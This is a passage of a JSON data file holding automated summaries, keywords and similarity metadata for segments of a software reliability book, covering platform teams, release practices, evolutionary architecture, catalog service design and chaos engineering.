      "summary": "Test scripts would request one URL, wait for the response, and then request another URL that was present on the response page.\nNone of the load-testing scripts tried hitting the same URL, without using cookies, 100 times per second.\nSince the site used only cookies for session tracking, not URL rewriting, all of our load test scripts used cookies.\nIf we set the throttle to 25 percent, then only 25 percent of requests for this gateway page would serve the real home page.\nThe home page was completely dynamically generated, from the JavaScript for the drop-down category menus to the product details and even to the link on the bottom of the page for “terms of use.” One of the application platform’s key selling points was personalization.\nSo this home page being generated and served up five million times a day was exactly the same every single time it got served.\n(Even if the data was already cached in memory, a transaction was still created because of the way the platform worked.) The drop-down menus with nice rollover effects required traversal of eighty-odd categories.\nStill, if the application server got involved in sending the home page, it would take time and create a session that would occupy memory for the next thirty minutes.\nThey say wonderful things like, “By viewing this page you have already agreed to the following conditions....” It turns out that those conditions exist for one reason.\nThe user’s session remains bound to the original server instance, so all new requests go back to the instance that already has the user’s session in memory.\nAfter every page request, the user’s session is serialized and sent\nShould the user’s original instance go down—deliberately or otherwise—the next request gets directed to a new instance, chosen by the load manager.\nThe new instance then attempts to load the user’s session from the session backup server.\n(At least, they are less likely to place an order at this site.) Without session failover, any user in the middle of checking out would not be able to finish when that instance went down.\nMost customers who got sent back to their cart page, when they’d been partway through the checkout process, just went away.\nThe direct cost of doubling the application server hardware is obvious, but it also brought added operational costs in labor and licenses.\nTwo years after the site launched, it could handle more than four times the load on fewer servers of the same original model.\nSoftware change can create new products and markets.\nIt can open up space for new alliances and new competition, creating surface area between businesses that used to be in different industries—like light bulb manufacturers running server-side software on a retailer’s cloud com- puting infrastructure.\nTo make a change, your company has to go through a decision cycle, as illustrated in the figure that follows.\nThe time it takes to go all the way around this cycle, from observation to action, is the key constraint on your company’s ability to absorb or create change.\nYou may formalize it as a Deming/Shewhart cycle,2 as illustrated in the previous figure; or an OODA (observe, orient, decide, act) loop,3 as shown in the figure that follows; or you might define a series of market experiments and A/B tests.\nDevOps helps remove even more delay in “act” and offers tons of new tools to help with “observe.” But we need to start the timer when the initial observations are made, not when the story lands in the backlog.\nThrashing happens when your organization changes direction without taking the time to receive, process, and incorporate feedback.\nBut be careful not to shorten development cycle time so much that it’s faster than how quickly you get feedback from the environment.\nIt creates team confusion, unfinished work, and lost productivity.\nFor example, if development moves faster than feedback, don’t use the spare cycles to build dev tools that speed up deployment.\nInstead, build an experimentation platform to help speed up observation and decisions.\nIn the sections that follow, we’ll look at some ways to change the structure of your organization to speed up the decision loop.\nWe’ll also consider some ways to change processes to move from running one giant decision loop to running many of them in parallel.\nPlatform Team\nDevelopers worked on applications.\nWhen we look at the layers from Chapter 7, Foundations, on page 141, we see the need for software development up and down the stack.\nWhether you’re in the cloud or in your own data center, you need a platform team that views application development as its customer.\nThat team should provide API and command-line provisioning for the common capabilities that appli- cations need, as well as the things we looked at in Chapter 10, Control Plane, on page 193:\nIn other words, the platform team should not implement all your specific monitoring rules.\nInstead, this team provides an API that lets you install your monitoring rules into the monitoring service provided by the platform.\nLikewise, the platform team doesn’t built all your API gateways.\nIt builds the service that builds the API gateways for individual application teams.\nThat doesn’t replace the need for your own platform team, but it does give the team a massive head start.\nThe platform team must not be held accountable for application availability.\nThat must be on the application teams.\nInstead, the platform team must be measured on the availability of the platform itself.\nThe platform team needs a customer-focused orientation.\nIts customers are the application developers.\nThe best rule of thumb is this: if your developers only use the platform because it’s mandatory, then the platform isn’t good enough.\nIt’s common these days, typically in larger enterprises, to find a group called the DevOps team.\nThis team sits between development and operations with the goal of moving faster and automating releases into production.\nIt’s a cultural transforma- tion, a shift from ticket- and blame-driven operations with throw-it-over-the-wall releases to one based on open sharing of information and skills, data-driven decision- making about architecture and design, and common values about production avail- ability and responsiveness.\nWhen a company creates a DevOps team, it has one of two objectives.\nOne possibility is that it’s really either a platform team or a tools team.\nIn that case, be very explicit that the team’s goal is not to produce software or a platform.\nTeam members need to spread the values and encourage others to adopt the spirit of DevOps.",
      "keywords": [
        "Platform Team",
        "team",
        "platform",
        "session",
        "application",
        "n’t",
        "home page",
        "DevOps Team",
        "report erratum",
        "time",
        "application teams",
        "decision loop",
        "decision",
        "user",
        "development"
      ],
      "concepts": [
        "team",
        "servers",
        "developers",
        "pages",
        "changes",
        "times",
        "create",
        "created",
        "report",
        "application"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 35,
          "title": "",
          "score": 0.68,
          "base_score": 0.53,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 9,
          "title": "",
          "score": 0.634,
          "base_score": 0.484,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.455,
          "base_score": 0.455,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 24,
          "title": "",
          "score": 0.45,
          "base_score": 0.45,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.405,
          "base_score": 0.405,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "team",
          "platform",
          "platform team",
          "session",
          "decision"
        ],
        "semantic": [],
        "merged": [
          "team",
          "platform",
          "platform team",
          "session",
          "decision"
        ]
      },
      "topic_id": 6,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2558164038133893,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.246985+00:00"
      }
    },
    {
      "chapter_number": 37,
      "title": "Segment 37 (pages 299-307)",
      "start_page": 299,
      "end_page": 307,
      "summary": "The release process described in Chapter 12, Case Study: Waiting for Godot, on page 237, rivals that of NASA’s mission control.\nThat uniqueness requires additional planning with each release, making the release a bit more painful—further discouraging more frequent releases.\nReleases should about as big an event as getting a haircut (or compiling a new kernel, for you gray-ponytailed UNIX hackers who don’t require haircuts).\nThe literature on agile methods, lean development, continuous delivery, and incremental funding all make a powerful case for frequent releases in terms of user delight and business value.\nWith respect to production operations, however, there’s an added benefit of frequent releases.\nThe right response is to reduce the effort needed, remove people from the process, and make the whole thing more automated and standardized.\nIf it looks good, then the code is cleared for release to the remaining machines.\nOnce the new pool looks good, you shift production traffic over to it.\nIn that case, deploying in waves lets you manage how fast you expose customers to the new code.\nSecond, they all limit the number of customers who might be exposed to a bug, either by restricting the time a bug might be visible or by restricting the number of people who can reach the new code.\nIt’s random, and changes fail more often than they succeed.\nWe will look at evolutionary architecture in Evolutionary Architecture, on page 302.\nThe idea is to make your organization antifragile by allowing independent change and variation in small grains.\nParadoxically, the key to making evolutionary architecture work is failure.\nThere’s a vicious cycle that comes into play: more code means it’s harder to change, so every piece of code needs to be more generalized, but that leads to more code.\nInstead of building a single “promotions service” as before, you could build two services that can each chime in when a new user hits your front end.\nIn the next figure, each service makes a decision based on whatever user infor- mation is available.\nThe user offers still need a database, but maybe the page-based offers just require a table of page types embedded in the code.\nAfter all, if you can deploy code changes in a matter of minutes, do you really need to invest in content management?\nShut off the service, delete the code, and reassign the team.\nIt’s not just about having fewer people on a team.\nYou can’t have a two-pizza team if you need a dedicated\nIf you ever find that you need to update both the provider and caller of an service interface at the same time, it’s a warning sign that those services are strongly coupled.\n(See Nonbreaking API Changes, on page 263, for strategies to avoid breakage.) If not, consider treating the new interface as a new route in your API.\nDependencies across teams also create timing and queuing problems.\nIf you need a DBA from the enterprise data architecture team to make a schema change before you can write the code, it means you have to wait until that DBA is done with other tasks and is available to work on yours.\nArchitecture review boards, release management reviews, change control committees, and the People’s Committee for Proper Naming Conventions...each review process adds more and more time.\nIt’s really about having a small group that can be self-sufficient and push things all the way through to production.\nThe platform team I discussed in Platform Team, on page 292, has a big part to play in all this.\nEfficiency sometimes translates to “fully utilized.” In other words, your com- pany is “efficient” if every developer develops and every designer designs close to 100 percent of the time.\nWe’ve seen this lesson time and time again from The Goal [Gol04], to Lean Software Development [PP03], to Principles of Product Development Flow [Rei09], to Lean Enterprise [HMO14] and The DevOps Handbook [KDWH16]: Keep the people busy all the time and your overall pace slows to a crawl.\nA more enlightened view of efficiency looks at the process from the point of view of the work instead of the workers.\nAn efficient value stream has a short cycle time and high throughput.\nBut there’s a subtle trap here: as you make a value stream more efficient, you also make it more specialized to today’s tasks.\nThat can make it harder to change for the future.\nWe can learn from a car manufacturer that improved its cycle time on the production line by building a rig that holds the car from the inside.\nAll the hidden connections that make it efficient also make it harder to adapt.\nA fully automated build pipeline that delivers containers straight into Kubernetes every time you make a commit and that shows commit tags on the monitoring dashboard will let you move a lot faster, but at the cost of making some serious commitments.\nIf there’s a natural order to software, it’s the Big Ball of Mud.4 Without close attention, dependencies proliferate and coupling draws disparate systems into one brittle whole.\nIn its place, he offers the rule of design evolution, “Form follows failure.” That is, changes in the design of such commonplace things as forks and paper clips are motivated more by the things early designs do poorly than those things they do well.\nIn this section, we’ll look at how the system’s architecture can make it easier to adapt over time.\nIn Building Evolutionary Architectures [FPK17], Neal Ford, Rebecca Parsons, and Patrick Kua define an evolutionary architecture as one that “supports incremental, guided change as a first principle across multiple dimensions.” Given that definition, you might reasonably ask why anyone would build a nonevolutionary architecture!\nSadly, it turns out that many of the most basic architecture styles inhibit that incremental, guided change.\nFor example, the typical enterprise applica- tion uses a layered architecture something like the one shown in the following illustration.\nWe get something like component-based architecture.\nInstead of worrying about how to isolate the domain layer from the database, we isolate components from each other.\nIf you squint, they look like microservice instances that happen to run in the same process.\nTrouble arises when layers are built: any common change requires a drilling expedition to pierce through several of them.\nHere, the domain dominates, so when a new concept enters the domain, it has shadows and reflections in the other layers.\n“Form” is a GUI concept, as is “Table” (but a different kind of table than the persistence one!) The boundary between each layer should be a matter of translating concepts.\nEach component owns its whole stack, from database up through user interface or API.\nThat does mean the eventual human interface needs a way to federate the UI from different components.\nIn the example we’ve just worked through, it allows incremental guided change along the dimensions of “business requirements” and “interface technology.” You should get comfortable with some of the other architecture styles that lend themselves to evolutionary architecture:\nGood for incremental change in require- ments, combining work from different teams.",
      "keywords": [
        "Waiting for Godot",
        "Painless Releases",
        "architecture",
        "evolutionary architecture",
        "Releases",
        "frequent releases",
        "team",
        "make",
        "NASA ’s mission",
        "time",
        "report erratum",
        "work",
        "code",
        "Service",
        "user"
      ],
      "concepts": [
        "user",
        "architecture",
        "service",
        "changes",
        "team",
        "different",
        "differs",
        "requires",
        "required",
        "requirements"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 31,
          "title": "",
          "score": 0.786,
          "base_score": 0.636,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 21,
          "title": "",
          "score": 0.673,
          "base_score": 0.523,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 32,
          "title": "",
          "score": 0.662,
          "base_score": 0.512,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 27,
          "title": "",
          "score": 0.626,
          "base_score": 0.476,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 25,
          "title": "",
          "score": 0.57,
          "base_score": 0.42,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "architecture",
          "evolutionary",
          "evolutionary architecture",
          "change",
          "incremental"
        ],
        "semantic": [],
        "merged": [
          "architecture",
          "evolutionary",
          "evolutionary architecture",
          "change",
          "incremental"
        ]
      },
      "topic_id": 0,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2983804606426799,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.247041+00:00"
      }
    },
    {
      "chapter_number": 38,
      "title": "Segment 38 (pages 308-316)",
      "start_page": 308,
      "end_page": 316,
      "summary": "That means any particular change is likely to encounter one of those and incur a large risk of “action at a distance.” This makes developers hesitant to touch the problem classes, so necessary refactoring pressure is ignored and the problem gets worse.\nIdeally, the service wouldn’t have any unique instance.\nThat way the service as a whole can survive the loss of the leader without manual interven- tion to reconfigure the cluster.\n2. Look it up by calling another service.\nIf the answer isn’t in our own database, we need to call another service.\nWhich service?\nIn order to get item information, your service must already know who to call!\nThat implicit dependency limits you to working with just the one service provider.\nIf you need to support items from two different “universes,” it’s going to be very disruptive.\nThis URL also still works if we need to resolve it to get more information.\nWe no longer need “test” versions of the other services.\nBut making implicit context into explicit context has big benefits inside services as well.\nIf you’ve worked on a Ruby on Rails system, you might have run into difficulty when trying to use multiple relational databases from a single service.\nThe graphics card is a module that you can substitute or replace.\nClark identify six “modular operators.” Their work was in the context of computer hardware, but it applies to distributed service-based systems as well.\nEvery module boundary gives you an option to apply these operators in the future.\nSplitting breaks a design into modules, or a module into submodules.\nSplitting requires insight into how the features can be decomposed so that cross-dependencies in the new modules are minimized and the extra work of splitting is offset by the increased value of more general modules.\nModule 1\nModule 2\nModule 2\nModule 3\nModule 4\nModule 4\nModule 3\nExample: We start with a module that determines how to ship products to a customer.\nOne way to split the module is shown in the next figure.\nA different way to split the modules might be one per carrier.\nThis makes the modules act a bit more like competitors.\nIn the original decomposition, if just one of the modules is broken, then the whole feature doesn’t work.\nIf we divide the work by carrier, as illustrated in the figure on page 310, then one carrier’s service may be down or malfunctioning but the others will continue to work.\nOf course, this assumes the parent module makes calls in parallel and times out properly when a module is unresponsive.\nThe key with splitting is that the interface to the original module is unchanged.\nAfterward, it delegates work to the new modules but supports the same interface.\nThe original module and the substitute need to share a common interface.\nIn our running example, we might substitute a logistics module from UPS or FedEx in place of our original home-grown calculator.\nAugmenting is adding a module to a system.\nFor example, if you decompose your system along technical lines you might end up with a module that writes to the database, a module that renders HTML, a module that supports an API, and a module that glues them all together.\nHow many of those modules could you exclude?\nInversion works by taking functionality that’s distributed in several modules and raising it up higher in the system.\nIn the following figure, several services have their own way of performing A/B tests.\nIndividual services don’t need to decide whether to put a user in the control group or the test group.\nBaldwin and Clark look at porting in terms of moving hardware or operating system modules from one CPU to another.\nPorting is really about repurposing a module from a different system.\nAny time we use a service created by a different project or system, we’re “porting” that service to our system, as shown in the following figure.\nModule 1\nModule 2\nModule 3\nModule X\nModule Y\nIt clearly means a new dependency, and if the road map of that service diverges from our needs, then we must make a substitution.\nThe new consumer must be careful to exercise the module thoroughly via the same interface that will be used in production.\nThat doesn’t mean the new caller has to replicate all the unit and integration tests that the module itself runs.\nAnother way of “porting” a module into our system is through instantiation.\nWe don’t talk about this option very often, but nothing says that a service’s code can only run in a single cluster.\nIf we need to fork the code and deploy a new instance, that’s also a way to bring the service into our system.",
      "keywords": [
        "module",
        "System",
        "service",
        "n’t",
        "System Architecture",
        "cluster",
        "report erratum",
        "Event-based Prefers asynchronous",
        "operating system modules",
        "work",
        "System Module",
        "Event-based Prefers",
        "discuss",
        "erratum",
        "report"
      ],
      "concepts": [
        "module",
        "services",
        "dependencies",
        "depend",
        "dependency",
        "clustering",
        "cluster",
        "instance",
        "work",
        "developer"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 40,
          "title": "",
          "score": 0.549,
          "base_score": 0.399,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 34,
          "title": "",
          "score": 0.465,
          "base_score": 0.315,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 39,
          "title": "",
          "score": 0.461,
          "base_score": 0.311,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.395,
          "base_score": 0.395,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 6,
          "title": "",
          "score": 0.394,
          "base_score": 0.394,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "module",
          "module module",
          "modules",
          "service",
          "porting"
        ],
        "semantic": [],
        "merged": [
          "module",
          "module module",
          "modules",
          "service",
          "porting"
        ]
      },
      "topic_id": 5,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.23833116330633244,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.247076+00:00"
      }
    },
    {
      "chapter_number": 39,
      "title": "Segment 39 (pages 317-324)",
      "start_page": 317,
      "end_page": 324,
      "summary": "Messages, Events, and Commands\nIn “What Do You Mean by ’Event-Driven’?”9 Martin Fowler points out the unfortunate overloading of the word “event.” He and his colleagues identified three main ways events are used, plus a fourth term that is often conflated with events:\nBut since it can be slow to walk through every event in history to figure out the value of attribute A on entity E, we often keep views to make it fast to answer that question.\nnext event\nWith an event journal, several views can each project things in a different way.\nTreat the messages like data instead of objects and you’re going to have a better time supporting very old formats.\nA catalog service should really handle many catalogs.\nThe first, most obvious approach is to assign an owner to each catalog, as shown in the following figure.\nAdd (POST Owner ID and Item data)\nItem URL\n1. The catalog service must couple to one particular authority for users.\n2. One owner can only have one catalog.\nIf a consuming application needs more than one catalog, it has to create multiple identities in the authority service (multiple account IDs in Active Directory, for example).\nWe should remove the idea of ownership from the catalog service altogether.\nAny user can create a catalog.\nThe catalog service issues an identifier for that specific cat- alog.\nThe user provides that catalog ID on subsequent requests.\nOf course, a catalog URL is a perfectly adequate identifier.\nCatalog URL\nCreate (POST to Catalogs Service)\nAdd (PUT to Catalog URL)\nItem URL\nQuery (GET on Catalog URL w/query params)Results\nIn effect, the catalog service acts like a little standalone SaaS business.\nIt has many customers, and the customers get to decide how they want to use that catalog.\nThey will change their catalogs all the time.\nAs shown in the figure on page 318, a “policy proxy” can map from a client ID (whether that client is internal or external makes no difference) to a catalog ID.\nThis way, questions of ownership and access control can be factored out of the catalog service itself into a more centrally controlled location.\nMap fromclient ID to catalog IDclient ID\ncatalog ID\nThis makes the service useful in many more contexts.\nThe typical way to get the item information is shown in the figure on page 319.\nThe front end looks up that ID in the database, gets the item details, and displays them.\nCatalog\nThat’s usually very hard, so we decide to have the front end look at the item ID and decide which database to hit, as shown in the figure that follows.\nCatalog\nThe only numbers that make sense are “zero,” “one,” and “many.” We can use URL dualism to support many databases by using URLs as both the item identifier and a resolvable resource.\nCatalog\nAs long as the new service returns a useful representation of that item, it will work.\nAnd who says the item details have to be served by a dynamic, database- backed service?\nThe item URL could point to an outbound API gateway that proxies a request to a supplier or partner.\nYou might recognize this as a variation of “Explicit Context.” (See Explicit Context, on page 306.) We use URLs because they carry along the context we need to fetch the underlying representation.\nIt gives us much more flexibility than plugging item ID numbers into a URL template string for a service call.",
      "keywords": [
        "Baldwin and Clark",
        "catalog",
        "URL",
        "catalog URL",
        "catalog service",
        "Item URL Query",
        "Catalog URL Caller",
        "service",
        "Information Architecture",
        "Item",
        "Item URL",
        "Clark argue",
        "event",
        "Architecture",
        "report erratum"
      ],
      "concepts": [
        "event",
        "services",
        "messages",
        "url",
        "urls",
        "catalog",
        "ids",
        "item",
        "make",
        "caller"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 40,
          "title": "",
          "score": 0.544,
          "base_score": 0.394,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 38,
          "title": "",
          "score": 0.461,
          "base_score": 0.311,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 34,
          "title": "",
          "score": 0.454,
          "base_score": 0.304,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 22,
          "title": "",
          "score": 0.428,
          "base_score": 0.428,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "catalog",
          "item",
          "url",
          "catalog url",
          "id"
        ],
        "semantic": [],
        "merged": [
          "catalog",
          "item",
          "url",
          "catalog url",
          "id"
        ]
      },
      "topic_id": 5,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.18575845374904557,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.247106+00:00"
      }
    },
    {
      "chapter_number": 40,
      "title": "Segment 40 (pages 325-333)",
      "start_page": 325,
      "end_page": 333,
      "summary": "One of the basic enterprise architecture patterns is the “Single System of Record.” The idea is that any particular concept should originate in exactly one system, and that system will be the enterprise-wide authority on entities within that concept.\nEven the question, “Who is allowed to create a customer instance?” will vary.\nIf you can exchange a URL for a representation that you can use like a customer, then as far as you care, it is a customer service, whether the data came from a database or a static file.\nThe company’s existing systems were set up to price every item individually.\nSomeone created a concept of a “price point” as an entity for the product management database.\nThen all the merchant would need to do is change the “amount” field on the price point and all related tracks would be repriced.\nThe tough question came when we started talking about all the other downstream systems that would need to receive a feed of the price points.\nThe basic customer-visible concepts of cat- egory, product, and item were very well established.\nIntroducing price point as a global concept across the retailer’s entire constel- lation of systems was a massive change.\nCoordinating all the releases needed to introduce that concept would make Rube Goldberg shake his head in sadness.\nBut it looked like that was required because every other system certainly needed to know what price to display, charge, or account for on the tracks.\nBut price point was not a concept that other systems needed for their own purposes.\nThey just needed it because the item data was now incomplete thanks to an upstream data model change.\nPrice point was a concept the upstream system needed for leverage.\nThere’s no such thing as a natural data model, there are only choices we make about how to represent things, relationships, and change over time.\nWe need to be careful about exposing internal concepts to other systems.\nThere’s no such thing as a “natural” data model, only choices that we make.\nWe can invert the relationship by making our service issue identifiers rather than receiving an “owner ID.” And we can take advantage of the dual nature of URLs to both act like an opaque token or an address we can deref- erence to get an entity.\nFinally, we must be careful about exposing concepts to other systems.\nEither systems grow over time, adapting to their changing environment, or they decay until their costs out- weigh their benefits and then die.\nChaos Engineering\nBreaking Things to Make Them Better\nAccording to the principles of chaos engineering,1 chaos engineering is “the discipline of experimenting on a distributed system in order to build confi- dence in the system’s capability to withstand turbulent conditions in pro- duction.” That means it’s empirical rather than formal.\nChaos engineering deals with distributed systems, frequently large-scale systems.\nStaging or QA environments aren’t much of a guide to the large- scale behavior of systems in production.\nChaos Engineering • 326\nThis all makes it hard to gain understanding of a whole system from a non-production environment.\nThis is why chaos engineering emphasizes the whole-system perspective.\nAntecedents of Chaos Engineering\nChaos engineering draws from many other fields related to safety, reliability, and control, such as cybernetics, complex adaptive systems, and the study of high-reliability organizations.\nIn particular, the multidisciplinary field of resilience engineering offers a rich area to explore for new directions in chaos.2\nAntecedents of Chaos Engineering • 327\n(In this context, when Dekker talks about systems, he means the whole collection of people, technology, and processes, not just the information systems.) Over time, there’s pressure to increase the economic return of the system.\nHuman nature also means people don’t want to work at the upper limit of possible productivity.\nChaos engineering provides that balancing force.\nIt springs from the view that says we need to optimize our systems for availability and tolerance to disrup- tion in a hostile, turbulent world rather than aiming for throughput in an idealized environment.\nAnother thread that led to chaos engineering has to do with the challenge of measuring events that don’t happen.\nChaos Engineering • 328\nDistributed information systems don’t naturally fall into that category!\nIn fact, we expect that disorder will occur, but we want to make sure there’s enough of it during normal operation that our systems aren’t flummoxed when it does occur.\nWe use chaos engineering the way a weightlifter uses iron: to create tolerable levels of stress and breakage to increase the strength of the system over time.\nProbably the best known example of chaos engineering is Netflix’s “Chaos Monkey.” Every once in a while, the monkey wakes up, picks an autoscaling cluster, and kills one of its instances.\nUnless they found a way to make the whole service immune to component failures, they would be doomed.\nIt was an “and.” They would use stability patterns to make individual instances more likely to survive.\nAt Netflix, chaos is an opt-out process.\nThat means every service in production will be subject to Chaos Monkey.\nThat isn’t just a paper process...exempt services go in a database that Chaos Monkey consults.\nOther companies adopting chaos engineering have chosen an opt-in approach.\nWhen you’re adding chaos to an organization, consider starting with opting in.",
      "keywords": [
        "Chaos Engineering",
        "System",
        "Chaos",
        "Chaos Monkey",
        "n’t",
        "Customer",
        "Engineering",
        "Monkey",
        "price point",
        "report erratum",
        "price",
        "make",
        "concept",
        "change",
        "data"
      ],
      "concepts": [
        "systems",
        "monkey",
        "engineering",
        "engineer",
        "chaos",
        "concept",
        "different",
        "services",
        "change",
        "changing"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 38,
          "title": "",
          "score": 0.549,
          "base_score": 0.399,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 39,
          "title": "",
          "score": 0.544,
          "base_score": 0.394,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 34,
          "title": "",
          "score": 0.494,
          "base_score": 0.344,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 43,
          "title": "",
          "score": 0.311,
          "base_score": 0.311,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "chaos",
          "chaos engineering",
          "engineering",
          "price",
          "concept"
        ],
        "semantic": [],
        "merged": [
          "chaos",
          "chaos engineering",
          "engineering",
          "price",
          "concept"
        ]
      },
      "topic_id": 5,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.21099827200942523,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.247139+00:00"
      }
    },
    {
      "chapter_number": 41,
      "title": "Segment 41 (pages 334-342)",
      "start_page": 334,
      "end_page": 342,
      "summary": "Chaos Engineering • 330\nFirst of all, your chaos engineering efforts can’t kill your company or your customers.\nCustomers are familiar with pressing the play button again if it doesn’t work the first time.\nIf every single request in your system is irreplaceably valuable, then chaos engineering is not the right approach for you.\nThe whole point of chaos engineering is to disrupt things in order to learn how the system breaks.\nYou also want a way to limit the exposure of a chaos test.\nYou’ll need a way to track a user and a request through the tiers of your system, and a way to tell if the whole request was ultimately successful or not.\nThe hypothesis behind Chaos Monkey was, “Clustered services should be unaffected by instance failures.” Observations quickly invalidated that hypothesis.\nIf that request starts outside your organization, you probably have some failures due to external network conditions (aborted connections on mobile devices, for example).\nInjecting Chaos\nThe next step is to apply your knowledge of the system to inject chaos.\nYou know the structure of the system well enough to guess where you can kill an instance, add some latency, or make a service call fail.\nThese are all “injec- tions.” Chaos Monkey does one kind of injection: it kills instances.\nFirst, some services just time out and report errors when they should have a useful fallback.\nChaos Engineering • 332\nNetflix uses failure injection testing (FIT) to inject more subtle failures.4 (Note that this is not the same “FIT” as the “framework for integrated testing” in Nonbreaking API Changes, on page 263.) FIT can tag a request at the inbound edge (at an API gateway, for example) with a cookie that says, “Down the line, this request is going to fail when service G calls service H.” Then at the call site where G would issue the request to H, it looks at the cookie, sees that this call is marked as a failure, and reports it as failed, without even making the request.\n(Netflix uses a common framework for all its outbound service calls, so it has a way to propagate this cookie and treat it uniformly.)\nBut which instances, connections, and calls are interesting enough to inject a fault?\nAnd where should we inject that fault?\nIntroducing Chaos to Your Neighbors by: Nora Jones , Senior Software Engineer and Coauthor of Chaos Engineering (O’Reilly, 2017)\nI was hired as the first and only person working on internal tools and developer productivity at a brand new e-commerce startup during a pivotal time.\nAbout two weeks into my role at this company, my manager asked me if we could start experimenting with chaos engineering to help detect some of these issues before they became major outages.\nGiven that I was new to the company and didn’t know all my col- leagues yet, I started this effort by sending an email to all the developers and business owners informing them we were beginning implementation of chaos engineering in QA and if they considered their services “unsafe to chaos” to let me know and they could opt out the first round.\nMoral of the story: chaos engineering is a quick way to meet your new colleagues, but it’s not a great way.\nProceed with caution and control your failures delicately, especially when it’s the first time you’re enabling chaos.\nhttps://medium.com/netflix-techblog/fit-failure-injection-testing-35d8e2a9bb2\nTargeting Chaos\nThis is how Chaos Monkey works.\nIf you’re just getting started with chaos engineering, then random selection is as good a process as any.\nYou’re looking for faults that lead to failures.\n(More about that later in this chapter.) When you inject faults into service-to-service calls, you’re searching for the crucial calls.\nRandomness works well at the beginning because the search space for faults is densely populated.\nBut imagine trying to exhaustively search a dimensional space, where n is the number of calls from service to service.\npossible faults to inject!\nWe need a way to devise more targeted injections.\nThis is why it’s important to study all the times when faults happen without failures.\nThe system did something to keep that fault from becoming a failure.\nComputers aren’t great at that, so we still have an edge when picking targets for chaos.\nChaos Engineering • 334\nUsing those traces, it’s possible to build a database of inferences about what services a request type needs.\n(See Automate and Repeat, on page 334, to read about ChAP, Netflix’s experimentation platform.) Once that link is cut, we may find that the request continues to succeed.\nPeter calls this building a “cunning malevolent intelligence.” It can dramatically reduce the time needed to run productive chaos tests.\nWith a known class of vulnerability, it’s time to find a way to automate testing.\nThere’s such a thing as too much chaos.\nIf the new injection kills instances, it probably shouldn’t kill the last instance in a cluster.\nIf the injection simulates a request failure between service G to service H, then it isn’t meaningful to simultaneously fail requests from G to every fallback it uses when H isn’t working!\nCompanies with dedicated chaos engineering teams are all building platforms that let them decide how much chaos to apply, when, to whom, and which services are off-limits.\nThe platform also needs to report its tests to monitoring systems, so you can correlate the test events with changes in production behavior.\nChaos isn’t always about faults in the software.\nHigh-reliability organizations use drills and simulations to find the same kind of systemic weaknesses in their human side as in the software side.\nBasically, you plan a time where some number of people are designated as “incapacitated.” Then you 